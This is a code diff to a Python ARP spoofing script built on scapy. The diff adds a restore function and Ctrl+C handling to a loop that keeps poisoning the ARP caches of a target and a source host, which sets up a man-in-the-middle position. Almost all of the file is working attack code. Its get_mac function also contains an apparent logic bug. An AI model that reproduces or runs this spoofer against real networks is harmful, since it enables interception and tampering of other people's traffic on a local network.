@@ -41,6 +41,7 @@ def get_mac(ip):
     if answered_list =="":
         return answered_list[0][1].hwsrc
 # end def
+
 # start def
 def spoof(ip_target, ip_spoof): 
     target_mac = get_mac(ip_target)
@@ -50,16 +51,31 @@ def spoof(ip_target, ip_spoof):
     
     return
 # end def
+
+# start def
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    
+    scapy.send(packet, count=4, verbose=False)
+# end def
+
 # start def
 def main():
     opt = get_args()
     send_packet = 0
-    while True:
-        spoof(opt.target, opt.source)
-        spoof(opt.source, opt.target)
-        send_packet+=2
-        print("\r[+] Packets Send:",send_packet, end=" ")
-        time.sleep(1)
+    try:
+        while True:
+            spoof(opt.target, opt.source)
+            spoof(opt.source, opt.target)
+            send_packet+=2
+            print("\r[+] Packets Send:",send_packet, end=" ")
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        print("[-] Detected CTRL + C ...... Resetting ARP Table ....")
+        restore(opt.target, opt.source) # panggil function restore
         
     return
 if __name__=='__main__':
